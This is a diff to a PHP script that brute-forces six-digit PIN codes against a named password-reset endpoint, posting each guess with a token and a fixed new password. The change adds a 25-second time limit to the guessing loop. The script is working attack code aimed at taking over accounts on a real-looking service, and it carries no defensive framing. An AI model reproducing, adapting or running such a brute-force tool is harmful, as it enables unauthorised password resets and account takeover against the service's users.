@@ -1,4 +1,6 @@
 <?php
+$msti = microtime(true);
+
 $ne=10;
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Expires: Mon, 26 Jul 1997 00:00:00 GMT");
@@ -40,6 +42,7 @@ echo "stat 0";
 }else if($status=="1"){
 curl_setopt($ch,CURLOPT_POST,1);
 for($i=0;$i<$ne;$i++){
+	
 //echo "activeToken=$token&pinNo=".sprintf("%06d",($pass+$i))."&newPassword=Don@1997";
 curl_setopt($ch,CURLOPT_POSTFIELDS,"activeToken=$token&pinNo=".sprintf("%06d",($pass+$i))."&newPassword=Don@1997");
 curl_setopt($ch,CURLOPT_URL,"https://openhouse.imimobile.com/ohindia/updatePinPassword.htm");
@@ -82,6 +85,8 @@ break;
 	$change="1";
 }
 
+if((microtime(true)-$msti)>=25)
+	break;
 }//for
 
 if($found=="0" && $change=="1"){
